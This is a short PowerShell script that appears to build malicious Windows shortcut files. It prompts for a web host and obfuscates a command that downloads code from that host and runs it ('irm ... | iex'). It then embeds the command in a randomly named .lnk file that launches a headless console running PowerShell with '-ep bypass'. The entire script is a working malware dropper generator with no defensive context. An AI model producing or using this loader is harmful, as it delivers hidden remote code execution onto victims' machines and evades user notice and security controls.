
$web=read-host "Webhost"
gc obfuscate.ps1|out-string|iex
$id=get-random $wordlist

$content=Invoke-PSObfuscation ($decryptor_func+";&""irm"" ""$web""|&""iex""") -NoJunk
$s=(New-Object -c WScript.Shell).CreateShortcut("$id.lnk")
$s.TargetPath="conhost.exe"
$s.Arguments=( ("--headless powershell -ep bypass -c '$content'"))
$s.Save()